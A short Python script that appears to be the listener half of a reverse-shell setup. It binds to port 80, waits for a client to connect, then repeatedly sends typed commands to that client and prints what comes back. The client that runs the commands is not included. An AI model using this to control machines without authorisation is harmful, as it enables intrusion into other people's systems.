# -*- coding: utf-8 -*-
"""
Created on Thu Aug 11 01:02:19 2022

@author: jyoti
"""

import socket
import sys

def create_socket():
    try:
        global host
        global port
        global s
        host=socket.gethostname()
        port=80
        s=socket.socket()   #socket crteation
    except socket.error as msg:
        print(str(msg))
# socket binding host and port and listening for connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("binding the host and port"+str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print(str(msg)+"\n"+ "retrying.....")
        bind_socket()
# accepting connection(socket must be listening)
def socket_accept():
    conn,address=s.accept()
    print("connected....","IP address is"+address[0]+"|Port"+str(address[1]))
    send_command(conn)
    conn.close()
#send commands to client 
def send_command(conn):
    while True:
        cmd=input("[S] >> ")
        if cmd=="exit" or cmd=="Quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response=str(conn.recv(1024),"utf-8")
            print("\t\t[R] >> "+client_response,)

def main():
    create_socket()
    bind_socket() 
    socket_accept()           
main()
        
        
